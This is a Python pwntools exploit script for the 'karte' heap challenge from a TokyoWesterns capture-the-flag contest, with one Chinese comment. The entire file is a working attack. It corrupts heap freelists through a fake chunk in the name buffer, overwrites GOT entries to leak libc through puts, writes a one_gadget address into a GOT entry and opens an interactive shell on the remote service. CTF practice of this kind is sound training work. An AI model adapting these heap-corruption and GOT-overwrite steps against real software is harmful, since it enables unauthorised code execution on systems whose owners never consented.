# encoding: utf-8

from pwn import *

context.arch = 'amd64'
libc = ELF('./libc.so.6')

def setName(content):
	r.sendafter('...', content)

def add(size, content):
	r.sendlineafter('>', '1')
	r.sendlineafter('>', str(size))
	r.sendafter('>', content)
	r.recvuntil('id ')
	return r.recvline()


def delete(idx):
	r.sendlineafter('>', '3')
	r.sendlineafter('>', str(idx))

def edit(idx, content):
	r.sendlineafter('>', '4')
	r.sendlineafter('>', str(idx))
	r.sendafter('>', content)

def rename(content):
	r.sendlineafter('>', '99')
	r.sendafter('...', content)


name = 0x6021a0
free_got = 0x602018
puts_got = 0x602020
puts_plt = 0x400710

while True:
	try:
		#r = process('./karte')
		r = remote('karte.chal.ctf.westerns.tokyo', 10001)
		
		# 獲取 name chunk
		setName(flat(0, 0x71, name+0x20, 0, 0, 0x71))
		for _ in range(7):
			key1 = add(0x60, 'a')
			delete(key1)

		key1 = add(0x60, 'a')
		key2 = add(0x60, 'a')
		delete(key2)
		delete(key1)
		edit(key1, p64(name)[:3])
		key1 = add(0x60, 'a')
		key2 = add(0x60, p64(0)*3 + p64(0x71))
		key3 = add(0x60, p64(0)*9 + p64(0x21))
		rename(flat(0, 0x71, 0, 0, 0, 0x21))
		delete(key1)
		delete(key2)
		delete(key3)

		target = 0x602075
		rename(flat(0, 0x71, target))
		key1 = add(0x60, 'a')
		key2 = add(0x68, '\x00'*3 + p64(0)*12 + '\x71')

		target = 0x6020e0
		delete(key1)
		rename(flat(0, 0x71, target))
		key1 = add(0x60, 'a')
		key2 = add(0x68, p64(0)*3 + p64(0x71) + p64(0)*2 + p32(3) + p32(4) + p64(0)*3 + p32(1) + p32(0x100) + p64(name+0x10)[:-1])
		delete(0x100)

		target = 0x602100
		rename(flat(0, 0x71, target))
		key1 = add(0x60, 'a')
		key2 = add(0x68, p64(0)*2 + p32(3) + p32(4) + p64(0)*3 + p32(1) + p32(0x100) + p64(free_got) + p64(0)*2 + p32(1) + p32(0x300) + p64(puts_got) + p64(0xdeadc0bebeef)[:-1])
		
		edit(0x100, p64(puts_plt)[:-2])
		delete(0x300)

		libc_base = u64(r.recvuntil('\x7f')[-6:]+'\x00'*2) - libc.symbols['puts']
		one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
		one_shot = libc_base + one_gadget[2]
		edit(0x300, p64(one_shot)[:-2])
		#DEBUG()

		r.interactive()
		break

	except EOFError:
		r.close()
		pass
	except KeyboardInterrupt:
		break	